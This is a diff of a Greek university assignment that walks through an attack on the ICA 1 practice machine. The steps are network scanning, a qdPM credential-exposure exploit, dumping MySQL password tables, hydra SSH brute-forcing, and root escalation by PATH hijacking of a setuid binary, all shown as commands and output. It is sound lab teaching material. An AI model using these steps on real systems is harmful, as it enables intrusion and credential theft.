@@ -1,9 +1,9 @@
 ---
-date: 2024-01-02
+date: 2024-01-12
 last_modified: 2024-01-02 18:39
 subject: ComputerSecurity
 type: assignment
-due: 
+due: 2024-01-27
 completed: false
 author: Νικόλας Φιλιππάτος
 coauthor: Λέανδρος Αρβανιτόπουλος
@@ -11,6 +11,7 @@ AM: 1072754
 coAM: 1072809
 title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύστημα
 ---
+
 
 <br>
 <br>
@@ -27,8 +28,8 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 
 | Ονοματεπώνυμο    | ΑΜ           |
 | ---------------- | ------------ |
-| `=this.coauthor` | `=this.coAM ` | 
-| `=this.author `   | `=this.AM `   |
+| `=this.coauthor` | `=this.coAM` | 
+| `=this.author`   | `=this.AM`   |
 
 Ημερομηνία: `=this.date`
 
@@ -48,13 +49,6 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 ---
 <div style="page-break-after: always;"></div>
 
-%% 
-# Inspired  
-
-[ICA 1 Write up](Hacking/VulnHub/ICA%201/ICA%201%20Write%20up.md)
-
-[ica-1-walkthrough-linkedin](Hacking/VulnHub/ICA%201/ica-1-walkthrough-linkedin.md)
- %%
 
 ----
 # Scenario  
@@ -86,7 +80,8 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 ### Attacker Machine 
 
 - Debian Linux 
-- Parrot OS Distribution 
+	- Parrot OS Distribution 
+- Terminal running Bash
 - Tools
 	- nmap
 	- mysql
@@ -106,10 +101,11 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 
 # Enumeration 
 
+Πρωτο βημα για να μπορεσουμε να κανουμε επιθεση στο μηχανημα, ειναι να κανουμε μια χαρτογραφηση του δικτυου και να ανακαλυψουμε τι υπολογιστες υπαρχουν.
+
 ## Host discovery
 
-Πρωτα απο ολα πρεπει να βρουμε σε ποια ip διευθυνση ειναι ο υπολογιστης που θελουμε να κανουμε επιθεση 
-Υπαρχουν διαφορα εργαλεία που μας επιτρεπουν χαρτογραφηση δικτυου 
+Υπαρχουν διαφορα εργαλεία που μας επιτρεπουν χαρτογραφηση δικτυου :
 
 #### arp-scan 
 
@@ -117,7 +113,7 @@ title: Υλοποίηση Επίθεσης σε Υπολογιστικό Σύσ�
 sudo arp-scan -I wlp4s0 --localnet 
 ```
 
-*Output:*
+<font color="#646a73">Output:</font>
 ```bash
 Interface: wlp4s0, type: EN10MB, MAC: ec:5c:68:db:c2:41, IPv4: 192.168.1.11
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
@@ -133,11 +129,18 @@ Ending arp-scan 1.10.0: 256 hosts scanned in 2.051 seconds (124.82 hosts/sec). 4
 
 #### nmap
 
+
+`````col
+
+
+````col-md
+
+
 ```bash
 sudo nmap -sn 192.168.1.1-254 -oN nmap/recon
 ```
 
-*Output:*
+<font color="#646a73">Output:</font>
 ```
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:16 EET
 Nmap scan report for H1600V7.home (192.168.1.1)
@@ -150,6 +153,10 @@ Nmap scan report for 192.168.1.11 (192.168.1.11)
 Host is up (0.000069s latency).
 Nmap done: 254 IP addresses (4 hosts up) scanned in 15.00 seconds
 ```
+````
+
+
+````col-md
 
 
 | flag              | explanation                                               |     | 
@@ -158,6 +165,11 @@ Nmap done: 254 IP addresses (4 hosts up) scanned in 15.00 seconds
 | `-oN`             | Αποθηκευει το output της εντολης σε human readable αρχειο |     |
 | `192.168.1.1-254` | Σκαναρει όλο το εσωτερικο δίκτυο                          |     |
 
+````
+
+`````
+
+
 
 Βλεπουμε οτι η δικια μας ip ειναι : 
 
@@ -165,6 +177,7 @@ Nmap done: 254 IP addresses (4 hosts up) scanned in 15.00 seconds
 ip a show wlp4s0 
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 192.168.1.11/24
 ```
@@ -172,10 +185,17 @@ ip a show wlp4s0
 
 Ξερουμε οτι στην `192.168.1.1` ειναι το router, οποτε εχουμε δυο πιθανους υπολογιστες που μπορουμε να κανουμε επιθεση : `192.168.1.7` και `192.168.1.9` 
 
+
+`````col
+
+
+````col-md
+
 ```bash
 nmap -Pn -sC -sV -T4 192.168.1.7 -oN nmap/machine_7
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:21 EET
 Nmap scan report for 192.168.1.7 (192.168.1.7)
@@ -188,6 +208,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 108.30 seconds
 ```
 
+````
+
+
+````col-md
+
+
 Επεξηγηση: 
 
 | flag  | explanation                                                                                       |
@@ -195,13 +221,18 @@ Nmap done: 1 IP address (1 host up) scanned in 108.30 seconds
 | `-Pn` | Παρακαμπτει την διαδικασια ευρεσης ενεργων host, και συμπεριφερεται σε ολους σαν να ειναι ενεργοι |
 | `-sC` | Τρεχει τα default script για σκαναρισμα των πορτων                                                |
 | `-sV` | Παραθετει πληροφοριες για τις υπηρεσιες που τρεχουν πισω απο τις ανοιχτες πορτες                  |
-| `-T4`      | Θετει timeout στα πακετα που στελνει το nmap για πιο γρηγορο σκαν                                                                                                   |
+| `-T4`      | Θετει timeout στα πακετα που στελνει το nmap για πιο γρηγορο σκαν |
+
+````
+`````
+
 
 
 ```bash
 nmap -Pn -sC -sV -T4 192.168.1.9 -oN nmap/machine_9 
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:20 EET
 Nmap scan report for 192.168.1.9 (192.168.1.9)
@@ -239,17 +270,33 @@ Nmap done: 1 IP address (1 host up) scanned in 9.84 seconds
 
 
 Εαν δεν αποδώσουν οι ανοιχτές πορτες που βρηκαμε με την παραπανω εντολη μπορουμε να τρεξουμε την ιδια εντολη με την παραμετρο `-p-`
+
+`````col
+
+````col-md
+
 Extensive Scan of the ports: 
 ```bash
 nmap -Pn -sC -sV -T4 192.168.1.9 -oN nmap/machine_9_2 -p- 
 ```
 
+````
+
+
+````col-md
+
 | flag  | explanation |
 | ----- | ----------- |
 | `-p-` | Σκαν των πορτων απο την αρχη εως το τελος (ολων των πορτων)             |
 
+````
+
+`````
+
+
 Βλεπουμε οτι στην `192.168.1.9` τρεχει υπηρεσιες που μπορει να ειναι ευαλωττες, αντιθετα με το `192.168.1.7` οποτε θα ασχοληθουμε με αυτην 
 
+Αναθετουμε την ip στην μεταβλητη ipt για να διευκολυνθουμε να τρεχουμε τις εντολες με την μεταβλητη $ipt: 
 ```bash 
 export ipt=192.168.1.9
 ```
@@ -270,7 +317,7 @@ export ipt=192.168.1.9
 nmap --script vuln $ipt -oN nmap/machine_9_vuln
 ```
 
-
+<font color="#646a73">Output:</font>
 ```bash
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-02 19:33 EET
 Nmap scan report for 192.168.1.9 (192.168.1.9)
@@ -326,13 +373,30 @@ nmap -Pn -sV --script vulners 192.168.1.9 -oN nmap/machine_9_vuln_2
 
 ## Identifying exploits 
 
+
+````col
+
+
+```col-md
 Απο το script αυτο μπορουμε να δουμε οτι  στην διευθυνση  `192.168.1.9` τρεχει ενα web server με την υπηρεσια apache. 
 Συγκεκριμενα οταν συνδεομαστε στο url http://192.168.1.9:80 βλεπουμε το περιεχομενο της σελιδας 
 
-![600](UNI/Semester-9/ComputerSecurity/assignments/pasted-pic-assignment-working.png)
-
 
 Βλεπουμε το version που τρεχει : `pdPM 9.2 `
+
+
+```
+
+
+```col-md
+
+![450](UNI/Semester-9/ComputerSecurity/assignments/pasted-pic-assignment-working.png)
+
+```
+
+
+````
+
 
 Και θα αξιοποιησουμε το εργαλειο `searchsploit` απο το πακετο `exploitdb`
 
@@ -363,6 +427,7 @@ cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
 searchsploit -x php/webapps/50176.txt
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 # Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
 # Date: 03/08/2021
@@ -425,9 +490,18 @@ whatweb http://$ipt
 
 Συνδεομαστε στην βαση δεδομενων με το username και τον κωδικο που βρηκαμε απο το κενο ασφαλειας : 
 
+
+`````col
+
+````col-md
+Εντολή σύνδεσης mysql :
 ```bash 
 mysql -u qdpmadmin -h 192.168.1.9 -p
 ```
+````
+
+
+````col-md
 
 Username:
 ```
@@ -440,8 +514,16 @@ UcVQCMQk2STVeS6J
 ```
 
 
+````
+
+
+
+`````
+
+
 Αφου συνδεθουμε στην MySQL βαση δεδομενων, θα περιηγηθουμε και θα επιλεξουμε την σωστη βαση και πινακες για να παρουμε δεδομενα που μας ενδιαφερουν
 
+<font color="#646a73">Output:</font>
 ```bash
 MySQL [(none)]> show databases;
 +--------------------+
@@ -479,7 +561,6 @@ MySQL [staff]> show tables;
 
 ```
 
-
 ```bash
 MySQL [staff]> select * from user;
 +------+---------------+--------+---------------------------+
@@ -495,7 +576,6 @@ MySQL [staff]> select * from user;
 
 ```
 
-
 ```bash
 MySQL [staff]> select * from login;
 +------+---------+--------------------------+
@@ -510,8 +590,6 @@ MySQL [staff]> select * from login;
 5 rows in set (0,022 sec)
 
 ```
-
-
 
 ```bash
 MySQL [staff]> select name,password from login join user on user_id=user.id;
@@ -546,6 +624,7 @@ WDdNUWtQM1cyOWZld0hkQw== - Possible algorithms: Base64(unhex(MD5($plaintext)))
 cat files/smith_password.b64 | base64 -d 
 ```
 
+<font color="#646a73">Output:</font>
 ```
 X7MQkP3W29fewHdC
 ```
@@ -616,15 +695,39 @@ if __name__ == "__main__":
 ```
 
 
+---
+<div style="page-break-after: always;"></div>
+
+---
+
 ## connecting to ssh 
 
 Δοκιμαζουμε καποιο απο τα passwords : 
 
+`````col
+
+````col-md
+
+Εντολή σύνδεσης ssh: 
 ```bash
 ssh Lucas@$ipt
 ```
 
+````
 
+
+````col-md
+
+
+Password
+```
+suRJAdGwLp8dy3rF
+```
+````
+
+`````
+
+<font color="#646a73">Output:</font>
 ```
 Lucas@192.168.1.9's password: 
 Permission denied, please try again.
@@ -637,16 +740,31 @@ Lucas@192.168.1.9's password:
 Υποψιαζομαστε οτι δεν εχουν αντιστοιχηθει σωστα τα passwords , οποτε εχοντας μαζεψει ολα τα usernames και passwords σε δυο αρχεια αξιοποιουμε το εργαλειο hydra για να κανουμε bruteforce το login του ssh. 
 
 
+`````col
 
+````col-md
+
+Εντολή Hydra
 ```bash
 hydra -L files/users.txt -P files/passwords.txt ssh://$ipt
 ```
+
+````
+
+````col-md
 
 | flag | explanation                             |
 | ---- | --------------------------------------- |
 | -L   | Ακολουθει ενα αρχειο με λιστα usernames |
 | -P   | Ακολουθει ενα αρχειο με λιστα passwords                                         |
 
+````
+
+`````
+W
+
+
+<font color="#646a73">Output:</font>
 ```bash
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -664,26 +782,39 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-03 00:11:
 Απο αυτο βλεπουμε οτι μονο δυο απο τα usernames και οι κωδικοι τους λειτουργουν για ssh login. 
 
 
-
 ### Connecting with ssh as travis
 
 Οποτε μπορουμε να συνδεθουμε σαν Travis με τον κωδικο 
 
+``````col
+`````col-md
+Εντολή σύνδεσης ssh: 
 ```bash
 ssh travis@192.168.1.9
 ```
 
+`````
+
+`````col-md
 Password:
 ```
 DJceVy98W28Y7wLg
 ```
 
+`````
+
+``````
+
+
+
 
 Αφου συνδεθουμε στο ssh :
+
 ```bash
 cat user.txt 
 ```
 
+<font color="#646a73">Output:</font>
 ```
 ICA{Secret_Project}
 ```
@@ -697,6 +828,7 @@ ICA{Secret_Project}
 sudo -l 
 ```
 
+<font color="#646a73">Output:</font>
 ```bash
 [sudo] password for travis: 
 Sorry, user travis may not run sudo on debian.
@@ -710,20 +842,33 @@ Sorry, user travis may not run sudo on debian.
 ### Connecting with ssh as dexter
 
 
+`````col
+
+````col-md
+Εντολή σύνδεσης ssh: 
+
 ```bash
 ssh dexter@$ipt 
 ```
+````
 
-Password
+````col-md
+Password: 
+
 ```
 7ZwV4qtg42cmUXGX
 ```
+````
 
+`````
+
+Θα κοιταξουμε να δουμε τι εχει στον φακελο του home του : 
 
 ```bash
 ls
 ```
 
+<font color="#646a73">Output:</font>
 ```
 note.txt
 ```
@@ -733,6 +878,7 @@ note.txt
 cat note.txt
 ```
 
+<font color="#646a73">Output:</font>
 ```
 It seems to me that there is a weakness while accessing the system.
 As far as I know, the contents of executable files are partially viewable.
@@ -908,14 +1054,21 @@ socket@GLIBC_2.2.5
 ```
 
 
-Μας ενδιαφερει ιδιαιτερα η 16η γραμμη : 
-```bash 
-cat /root/system.info
+Μας ενδιαφέρει ιδιαίτερα η 2η και 16 γραμμη: 
+```bash
+2: setuid
+16: cat /root/system.info
 ```
 
-γιατι βλεπουμε οτι μπορει να τρεξει cat στο /root directory . 
+%%
+Normally, on a unix-like operating system, the ownership of files and directories is based on the default `uid` (user-id) and `gid` (group-id) of the user who created them. The same thing happens when a process is launched: it runs with the effective user-id and group-id of the user who started it, and with the corresponding privileges. This behavior can be modified by using special permissions.
+%%
 
-Το cat δεν εχει absolute path στην 16 γραμμη.
+Οταν χρησιμοποιειται το `setuid` bit, τοτε το αρχείο που γινεται executed δεν τρεχει με τα δικαιωματα του χρηστη που το έτρεξε αλλά με τα δικαιώματα του ιδιοκτήτη του αρχείου. Στην συγκεκριμένη περίπτωση ο ιδιοκτήτης είναι ο root. 
+
+Έπειτα βλεπουμε οτι μπορει να τρεξει cat στο /root directory . Όμως το cat δεν εχει absolute path στην 16 γραμμη.
+
+
 
 Με την παρακατω εντολη βρισκουμε ποιο προγραμμα καλει η εντολη cat οταν καλειται 
 
@@ -924,6 +1077,7 @@ cat /root/system.info
 which cat 
 ```
 
+<font color="#646a73">Output:</font>
 ```
 /usr/bin/cat
 ```
@@ -958,17 +1112,16 @@ chmod +x /tmp/cat
 ```
 Now when we execute the binary, since it executed **"cat" relatively**, it will now execute our own "**cat**" and since the owner is "**root**" and it is an **"SUID" binary**, we can alter the content of our "**cat**" to assign "**SUID**" privilege to "**bash**". We open our "**cat**" and write the following in it: **chmod u+s /bin/bash.** if you can't use **nano** to edit the file, write **export TERM=xterm** and press enter. We close the file and proceed to execute the binary **/opt/get_access**, and it tells us:
 ```
-
 %%
 
 
+Στοχος μας ειναι να πειραξουμε το PATH, ωστε οταν καλει την cat, να μην καλει την `/usr/bin/cat` αλλα την `/tmp/cat`. Για αυτο βαζουμε πρωτα στο PATH τον φακελο temp.
 
-Στοχος μας ειναι να πειραξουμε το PATH, ωστε οταν καλει την cat, να μην καλει την `/usr/bin/cat` αλλα την `/tmp/cat`
 
 ```bash
 export PATH=/tmp:$PATH
 ```
-
+<font color="#646a73">Output:</font>
 ```
 /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
@@ -989,7 +1142,7 @@ cd /root/
 ```
 
 
-Τρεχουμε το `/opt/get_access`, το οποιο τρεχει με root privileges και καλει την cat, την οποια εχουμε πειραξει να τρεχει `/bin/bash` δινοντας μας προσβαση στα παντα 
+Τρεχουμε το `/opt/get_access`, το οποιο τρεχει με root privileges λόγω του `setuid` bit και καλει την cat, την οποια εχουμε πειραξει να τρεχει `/bin/bash` δινοντας μας shell με δικαιώματα root user.
 
 
 ```bash
@@ -1016,11 +1169,11 @@ strings root.txt
 ```
 
 ```
-ICA{Next_Generation_Self_Renewable_Genetics}
+Super Secret Project Information is leaked!!!
 ```
 
 
-Κατεβαζουμε το encrypted.zip αρχειο. 
+Μέσα στον φάκελο βλεπουμε και ενα zip αρχειο το οποιο ειναι encrypted με κωδικο,
 
 Βλεπουμε 
 
@@ -1032,6 +1185,8 @@ unzip encrypted.zip
 Archive:  encrypted.zip
 [encrypted.zip] ../script.sh password: 
 ```
+
+Κατεβαζουμε το encrypted.zip αρχειο. 
 
 
 ---
@@ -1073,5 +1228,43 @@ Proceeding with incremental:ASCII
 
 
 ----
+<div style="page-break-after: always;"></div>
+
+---
+
+# References & Tools 
+
+
+````col
+
+```col-md
+
+### Tools 
+
+- [hydra](https://www.kali.org/tools/hydra)
+- [arp-scan](https://www.kali.org/tools/arp-scan/)
+- [nmap](https://www.kali.org/tools/nmap/)
+- [john](https://www.kali.org/tools/john/)
+- [mysql](https://wiki.debian.org/MySql)
+- [exploitdb](https://www.kali.org/tools/exploitdb/)
+- [ip](https://www.howtogeek.com/657911/how-to-use-the-ip-command-on-linux/)
+- [curl](https://curl.se/docs/manpage.html)
+- [find](https://www.howtogeek.com/771399/how-to-use-the-find-command-in-linux/)
+- 
+
+
+```
+
+
+```col-md
+### References 
+
+- [Setuid Special Permissions](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
+- [nmap vulnerability scan](https://www.stationx.net/how-to-scan-vulnerabilities-with-nmap/)
+```
+
+
+
+````
 
 [Table Of Contents](UNI/Semester-9/ComputerSecurity/assignments/assignment-working.md#Table%20Of%20Contents)
